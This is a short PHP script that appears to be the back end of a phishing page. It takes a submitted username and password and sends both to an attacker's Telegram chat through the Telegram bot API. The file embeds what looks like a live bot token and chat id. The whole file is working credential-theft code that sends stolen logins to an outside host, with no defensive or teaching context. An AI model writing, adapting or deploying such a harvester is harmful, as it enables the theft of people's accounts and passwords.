<?php
// Telegram Bot setup
$token = "8791112467:AAFMEEbL_29FmQAdhelhotY0csVeCsdoe8U"; 
$chat_id = "7052315231"; 

// Get user input
$username = trim($_POST['username']);
$password = trim($_POST['password']);

// Prepare Telegram message
$message = "📬 *New Login Attempt*\n\n👤 Username: @$username\n🔑 Password: $password";

// Send message to Telegram
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message) . "&parse_mode=Markdown");

// Success message (or redirect)
echo "Login details sent to Telegram.";
?>      


